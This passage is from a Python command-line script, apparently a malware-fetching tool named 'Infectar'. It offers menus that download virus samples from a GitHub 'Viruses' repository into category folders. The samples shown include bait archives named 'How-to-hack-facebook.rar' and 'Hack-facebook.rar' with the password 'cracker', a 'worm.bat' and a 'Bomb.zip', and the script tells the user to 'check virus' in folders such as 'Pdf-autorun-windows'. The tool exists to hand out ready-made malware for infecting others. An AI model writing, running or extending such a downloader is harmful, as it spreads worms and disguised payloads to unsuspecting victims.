						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'howtohackfb.rar?raw=true' Pdf-autorun-windows/How-to-hack-facebook.rar")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Pdf-autorun-windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}How-to-hack-facebook.rar{}]'.format(blue,yellow,blue,white,magenta,white))
					print('{}[{}tip{}] {}File password = [{}cracker{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif pd in('2','02'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/hackfacebook.rar?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'hackfacebook.rar?raw=true' Pdf-autorun-windows/Hack-facebook.rar")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Pdf-autorun-windows folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Hack-facebook.rar{}]'.format(blue,yellow,blue,white,magenta,white))
					print('{}[{}tip{}] {}File password = [{}cracker{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			else:
				print('{}[{}Err{}] {}Unknown choice!!!'.format(blue,red,blue,white))
				sleep(2)
				exit()
		@staticmethod
		def other():
			print('{}[{}01{}] {}Worm.bat\t\t\t{}[{}02{}] {}Bomb.zip'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}tip{}] {}Ctrl+c to exit'.format(blue,red,blue,white))
			oth = input('{}[{}choice{}] >>>>> {}'.format(white,blue,white,green))
			if oth in('1','02'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/worm.bat?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'worm.bat?raw=true' Worm-and-Bombzip/worm.bat")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Worm-and-Bombzip folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}worm.bat{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif oth in('2','02'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bom-zip.zip?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'bom-zip.zip?raw=true' Worm-and-Bombzip/Bomb.zip")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Worm-and-Bombzip folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Bomb.zip{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			else:
				print('{}[{}Err{}] {}Unknown choice!!!'.format(blue,red,blue,white))
				sleep(2)
				exit()
	parse = optparse.OptionParser(white+"""Usage ::>> python main.py """+green+"""-[option]"""+white+"""                        
	>|"""+green+"""-android"""+white+""""""+blue+""" <ANDROID>"""+white+""" Opens Android file category
	>|"""+green+"""-shell"""+white+""""""+blue+""" <SHELL> """+white+"""Opens Shell file category
	>|"""+green+"""-windows """+white+""""""+blue+"""<WINDOWS> """+white+"""Opens Windows file category
	>|"""+green+"""-pdf"""+white+""" """+blue+"""<PDF>"""+white+""" Opens PDF file category
	>|"""+green+"""-macosx """+white+""""""+blue+"""<MACOSX>"""+white+""" Opens MacOsX file category
	>|"""+green+"""-update"""+white+""" """+blue+"""<UPDATE> """+white+"""updates the script
	>|"""+green+"""-other"""+white+""" """+blue+"""<OTHER FILES>"""+white+""" Opens an additional category
	>|"""+green+"""-info"""+white+""" """+blue+"""<INFO>"""+white+""" Displays script info
		
"""+yellow+"""Usage Example"""+white+""" >>>
"""+blue+"""python main.py """+red+"""-update """+white+"""     >> updating the script
"""+blue+"""python main.py"""+red+""" -android """+white+""" >> opens android category
"""+blue+"""python main.py"""+red+""" -h """+white+"""            >> More defined help""")
	def Main():
		parse.add_option("-a","--Android",dest="android",type="string",
			help="write as [-android], opens Android Category")
		parse.add_option("-s","--Shell",dest="shell",type="string",
			help="write as [-shell], opens Shell category")
		parse.add_option("-w","--Windows",dest="windows",type="string",
			help="write as [-windows], opens Windows category")
		parse.add_option("-p","--Pdf",dest="pdf",type="string",
			help="write as [-pdf], opens PDF category")
		parse.add_option("-m","--Macosx",dest="macosx",type="string",
			help="write as [-macosx], opens MacOsX category")
		parse.add_option("-u","--Update",dest="update",type="string",
			help="write as [-update], Updates this script")
		parse.add_option("-o","--Other",dest="other",type="string",
			help="write as [-other], unnamed file category")
		parse.add_option("-i","--Info",dest="info",type="string",
			help="write as [-info], shows script info")
		(options,args) = parse.parse_args()
		infect=Infectar()
		android=options.android
		shell=options.shell
		windows=options.windows
		macosx=options.macosx
		pdf=options.pdf
		other=options.other
		info=options.info
		update=options.update
		opts = [android,info,update,shell,windows,macosx,pdf,other]
		if android:
			infect.android()
			exit()
		elif info:
			infect.info()
			exit()
		elif update:
			infect.update()
			exit()
		elif shell:
			infect.shell()
			exit()
		elif windows:
			infect.windows()
			exit()
		elif macosx:
			infect.macosx()
			exit()
		elif pdf:
			infect.pdf()
			exit()
		elif other:
			infect.other()
			exit()
		else:
			print(parse.usage)
			exit()
		exit()
	if __name__=='__main__':
		Main()
except (EOFError, KeyboardInterrupt):
	print('\n{}[{}!{}] {}Closed'.format(blue,red,blue,red))
	print('{}[+] {}by {}g1ng3rb1t3 {}(kevo)'.format(blue,white,green,red))
	print('{}[+] {}Regards {}^-^'.format(blue,white,green))